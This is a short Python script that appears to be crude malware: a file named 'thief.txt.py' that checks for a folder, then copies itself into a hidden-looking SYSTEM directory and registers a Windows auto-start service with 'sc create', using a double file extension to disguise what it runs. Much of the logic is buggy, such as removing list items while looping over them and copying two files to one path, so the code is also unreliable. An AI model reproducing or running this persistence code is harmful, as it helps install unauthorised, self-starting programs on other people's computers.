import os
import shutil
import subprocess

DAEMON_NAME="daemon.py"
THIEF_NAME="thief.txt.py"
DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
ROOT_PATH="D:\\vscode\\SYSTEM\\"

class computer:
    drive=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
    enermy=False

    def __init__(self):
        for d in self.drive:
            if not(os.path.exists(d)): self.drive.remove(d)
        if not(os.path.exists(ROOT_PATH)): self.enermy=True

def attack():
    shutil.copyfile(os.getcwd()+DAEMON_NAME, DAEMON_PATH)
    shutil.copyfile(os.path.abspath(__file__), DAEMON_PATH)
    os.system("sc create serviceName binPath="+DAEMON_PATH+" start= auto")

def getfile():
    s=os.path.abspath(__file__)
    s2=s.split(".")
    return s2[0]+"."+s2[1]

target=computer()
if target.enermy==True: 
    attack()

path=getfile()
print(path)
os.system(path)